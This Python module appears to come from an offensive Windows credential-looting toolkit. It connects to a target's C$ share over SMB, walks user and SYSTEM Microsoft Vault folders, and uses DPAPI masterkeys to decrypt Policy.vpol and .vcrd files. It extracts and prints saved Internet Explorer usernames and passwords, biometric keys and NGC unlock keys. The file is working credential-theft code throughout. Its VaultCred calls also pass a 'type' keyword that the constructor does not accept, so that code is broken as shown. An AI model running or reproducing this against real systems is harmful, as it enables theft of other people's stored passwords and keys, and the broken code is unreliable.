import logging
import ntpath
from typing import Any, List, Optional
from binascii import hexlify

from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dpapi import (
    VAULT_INTERNET_EXPLORER,
    VAULT_WIN_BIO_KEY,
    VAULT_NGC_ACCOOUNT,
)

from dploot.lib.dpapi import decrypt_vcrd, decrypt_vpol, find_masterkey_for_vpol_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_guid
from dploot.triage.masterkeys import Masterkey


class VaultCred:
    def __init__(
        self,
        winuser,
        blob,
        vault_type: "VAULT_INTERNET_EXPLORER|VAULT_WIN_BIO_KEY|VAULT_NGC_ACCOOUNT| Any",
        username: Optional[str] = None,
        resource: Optional[str] = None,
        password: Optional[str] = None,
        sid: Optional[str] = None,
        friendly_name: Optional[str] = None,
        biometric_key: Optional[str] = None,
        unlock_key: Optional[str] = None,
        IV: Optional[str] = None,
        cipher_text: Optional[str] = None,
    ):
        self.blob = blob
        self.winuser = winuser
        if vault_type is VAULT_INTERNET_EXPLORER:
            self.type = "Internet Explorer"
            self.username = username
            self.resource = resource
            self.password = password
        elif vault_type is VAULT_WIN_BIO_KEY:
            self.type = "WINDOWS BIOMETRIC KEY"
            self.sid = sid
            self.friendly_name = friendly_name
            self.biometric_key = biometric_key
        elif vault_type is VAULT_NGC_ACCOOUNT:
            self.type = "NGC LOCAL ACCOOUNT"
            self.sid = sid
            self.friendly_name = friendly_name
            self.unlock_key = unlock_key
            self.IV = IV
            self.cipher_text = cipher_text
        else:
            self.type = "None"

    def dump(self) -> None:
        self.blob.dump()
        if hasattr(self, "password") and self.password is not None:
            print("Decoded Password: %s" % self.password)
            print()

    def dump_quiet(self) -> None:
        if self.type == "Internet Explorer":
            print(
                f"[Internet Explorer] {self.resource} - {self.username}:{self.password}"
            )


class VaultsTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    user_vault_generic_path = [
        "Users\\%s\\AppData\\Local\\Microsoft\\Vault",
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Vault",
    ]
    system_vault_generic_path = [
        "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault",
    ]
    share = "C$"
    vpol_filename = "Policy.vpol"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_vault_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_vault_callback = per_vault_callback

    def triage_system_vaults(self) -> List[VaultCred]:
        vaults_creds = []
        vault_dirs = self.conn.listDirs(self.share, self.system_vault_generic_path)
        for system_vault_path, system_vault_dir in vault_dirs.items():
            if system_vault_dir is not None:
                vaults_creds += self.triage_vaults_folder(
                    user="SYSTEM",
                    vaults_folder_path=system_vault_path,
                    vaults_folder=system_vault_dir,
                )
        return vaults_creds

    def triage_vaults(self) -> List[VaultCred]:
        vaults_creds = []
        for user in self.users:
            try:
                vaults_creds += self.triage_vaults_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                logging.debug(str(e))
        return vaults_creds

    def triage_vaults_for_user(self, user: str) -> List[VaultCred]:
        vaults_creds = []
        vault_dirs = self.conn.listDirs(
            self.share, [elem % user for elem in self.user_vault_generic_path]
        )
        for user_vault_path, user_vault_dir in vault_dirs.items():
            if user_vault_dir is not None:
                vaults_creds += self.triage_vaults_folder(
                    user=user,
                    vaults_folder_path=user_vault_path,
                    vaults_folder=user_vault_dir,
                )
        return vaults_creds

    def triage_vaults_folder(
        self, user, vaults_folder_path, vaults_folder
    ) -> List[VaultCred]:
        vaults_creds = []
        for d in vaults_folder:
            if is_guid(d.get_longname()) and d.is_directory() > 0:
                vault_dirname = d.get_longname()
                vault_directory_path = ntpath.join(vaults_folder_path, vault_dirname)
                logging.debug(
                    f"Found Vault Directory: \\\\{self.target.address}\\{self.share}\\{vault_directory_path}\n"
                )

                # read vpol blob
                vpol_filepath = ntpath.join(vault_directory_path, self.vpol_filename)
                vpolblob_bytes = self.conn.readFile(self.share, vpol_filepath, looted_files=self.looted_files)
                vpol_keys = []
                if vpolblob_bytes is not None and self.masterkeys is not None:
                    masterkey = find_masterkey_for_vpol_blob(
                        vpolblob_bytes, self.masterkeys
                    )
                    if masterkey is not None:
                        vpol_decrypted = decrypt_vpol(vpolblob_bytes, masterkey)
                        if vpol_decrypted["Key1"]["Size"] > 0x24:
                            vpol_keys.append(
                                hexlify(vpol_decrypted["Key2"]["bKeyBlob"])
                            )
                            vpol_keys.append(
                                hexlify(vpol_decrypted["Key1"]["bKeyBlob"])
                            )
                        else:
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted["Key2"]["bKeyBlob"]["bKey"]
                                ).decode("latin-1")
                            )
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted["Key1"]["bKeyBlob"]["bKey"]
                                ).decode("latin-1")
                            )
                    else:
                        logging.debug("Could not decrypt...")

                # read vrcd blob
                vault_dir = self.conn.remote_list_dir(self.share, vault_directory_path)
                for file in vault_dir:
                    filename = file.get_longname()
                    if (
                        filename != self.vpol_filename
                        and filename not in self.false_positive
                        and file.is_directory() == 0
                        and filename[-4:] == "vcrd"
                    ):
                        vrcd_filepath = ntpath.join(vault_directory_path, filename)
                        vrcd_bytes = self.conn.readFile(self.share, vrcd_filepath, looted_files=self.looted_files)
                        if (
                            vrcd_bytes is not None
                            and filename[-4:] in ["vsch", "vcrd"]
                            and len(vpol_keys) > 0
                        ):
                            vault = decrypt_vcrd(vrcd_bytes, vpol_keys)
                            try:
                                if isinstance(
                                    vault,
                                    (
                                        VAULT_INTERNET_EXPLORER,
                                        VAULT_WIN_BIO_KEY,
                                        VAULT_NGC_ACCOOUNT,
                                    ),
                                ):
                                    vault_cred = None
                                    if isinstance(vault, VAULT_INTERNET_EXPLORER):
                                        vault_cred = VaultCred(
                                            winuser=user,
                                            blob=vault,
                                            type=type(vault),
                                            username=vault["Username"].decode(
                                                "utf-16le"
                                            ),
                                            resource=vault["Resource"].decode(
                                                "utf-16le"
                                            ),
                                            password=vault["Password"].decode(
                                                "utf-16le"
                                            ),
                                        )
                                    elif isinstance(vault, VAULT_WIN_BIO_KEY):
                                        vault_cred = VaultCred(
                                            winuser=user,
                                            blob=vault,
                                            type=type(vault),
                                            sid=RPC_SID(
                                                b"\x05\x00\x00\x00" + vault["Sid"]
                                            ).formatCanonical(),
                                            friendly_name=vault["Name"].decode(
                                                "utf-16le"
                                            ),
                                            biometric_key=(
                                                hexlify(vault["BioKey"]["bKey"])
                                            ).decode("latin-1"),
                                        )
                                    elif isinstance(vault, VAULT_NGC_ACCOOUNT):
                                        # take non existing keys into account
                                        try:
                                            biometric_key = (
                                                hexlify(vault["BioKey"]["bKey"])
                                            ).decode("latin-1")
                                        except KeyError:
                                            biometric_key = None
                                        try:
                                            unlock_key = hexlify(vault["UnlockKey"])
                                        except KeyError:
                                            unlock_key = None
                                        try:
                                            iv = hexlify(vault["IV"])
                                        except KeyError:
                                            iv = None
                                        try:
                                            cipher_text = hexlify(vault["CipherText"])
                                        except KeyError:
                                            cipher_text = None

                                        vault_cred = VaultCred(
                                            winuser=user,
                                            blob=vault,
                                            type=type(vault),
                                            sid=RPC_SID(
                                                b"\x05\x00\x00\x00" + vault["Sid"]
                                            ).formatCanonical(),
                                            friendly_name=vault["Name"].decode(
                                                "utf-16le"
                                            ),
                                            biometric_key=biometric_key,
                                            unlock_key=unlock_key,
                                            IV=iv,
                                            cipher_text=cipher_text,
                                        )
                                    if vault_cred is not None:
                                        vaults_creds.append(vault_cred)
                                        if self.per_vault_callback is not None:
                                            self.per_vault_callback(vault_cred)
                                else:
                                    logging.debug(
                                        "Vault decrypted but unknown data structure:"
                                    )
                            except Exception as e:
                                # report the exception, and continue the for loop
                                if logging.getLogger().level == logging.DEBUG:
                                    import traceback

                                    traceback.print_exc()
                                logging.debug(
                                    f"{e!s} while parsing vault:{vault.__class__} {vault.__dict__}"
                                )
        return vaults_creds

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users